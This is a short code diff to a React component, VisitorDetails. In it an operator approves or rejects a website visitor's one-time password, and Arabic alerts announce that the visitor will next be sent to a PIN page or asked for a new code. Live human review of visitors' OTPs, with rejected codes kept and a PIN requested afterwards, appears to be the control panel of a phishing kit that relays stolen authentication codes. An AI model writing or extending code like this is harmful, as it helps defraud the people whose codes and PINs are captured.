@@ -414,13 +414,13 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
 
         case "otp":
           if (action === "approve") {
-            // Approve OTP - redirect to /confi
-            await updateApplication(visitor.id, { otpStatus: "approved" })
+            // Approve OTP using proper handler
+            await handleOtpApproval(visitor.id, bubble.id, visitor.history)
             alert("تم قبول كود OTP! سيتم توجيه الزائر لصفحة PIN")
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض كود OTP؟")) {
-              // Reject OTP - save to oldOtp and reset
-              await updateApplication(visitor.id, { otpStatus: "rejected" })
+              // Reject OTP using proper handler
+              await handleOtpRejection(visitor.id, bubble.id, visitor.history)
               alert("تم رفض كود OTP! سيتم توجيه الزائر لإدخال كود جديد")
             }
           }
